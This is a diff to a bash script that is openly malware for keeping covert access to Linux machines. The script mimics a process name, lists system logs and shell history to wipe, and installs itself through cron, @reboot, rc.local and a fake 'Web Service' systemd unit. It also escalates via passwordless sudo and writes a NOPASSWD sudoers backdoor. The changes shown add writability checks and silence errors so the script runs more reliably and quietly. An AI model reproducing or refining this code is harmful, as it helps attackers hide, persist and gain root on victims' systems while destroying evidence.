@@ -19,7 +19,7 @@ PROCESS_NAME="[webservice]"  # Process name to mimic
 LOG_FILES=("/var/log/auth.log" "/var/log/syslog" "/var/log/utmp" "/var/log/wtmp" "$HOME/.bash_history")  # Logs to clean
 PERSIST_METHODS=(
     "(crontab -l 2>/dev/null | grep -v $HIDDEN_FILE; echo \"* * * * * /bin/bash $HIDDEN_FILE > /dev/null 2>&1\") | crontab -"
-    "[ -f /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
+    "[ -f /etc/rc.local ] && [ -w /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
     "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
     "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
 )
@@ -113,7 +113,7 @@ if [ $EUID -ne 0 ]; then
     # Try sudo first
     if sudo -n true 2>/dev/null; then
         if [ "$0" != "$SCRIPT_FILE" ]; then
-            mkdir -p "$HIDDEN_DIR"
+            mkdir -p "$HIDDEN_DIR" 2>/dev/null
             cp "$0" "$SCRIPT_FILE" 2>/dev/null
             chmod 700 "$SCRIPT_FILE" 2>/dev/null
             exec sudo /bin/bash "$SCRIPT_FILE" "$@"
@@ -148,7 +148,7 @@ done
 
 # Add sudoers entry for root elevation on reboot
 if [ $EUID -eq 0 ]; then
-    if [ -d "/etc/sudoers.d" ]; then
+    if [ -d "/etc/sudoers.d" ] && [ -w "/etc/sudoers.d" ]; then
         echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE" 2>/dev/null
         if [ $? -eq 0 ]; then
             chmod 440 "$SUDOERS_FILE" 2>/dev/null
@@ -157,7 +157,7 @@ if [ $EUID -eq 0 ]; then
             echo "Failed to write to $SUDOERS_FILE. Skipping sudoers setup." >&2
         fi
     else
-        echo "/etc/sudoers.d not found. Skipping sudoers setup." >&2
+        echo "/etc/sudoers.d not found or not writable. Skipping sudoers setup." >&2
     fi
 fi
 
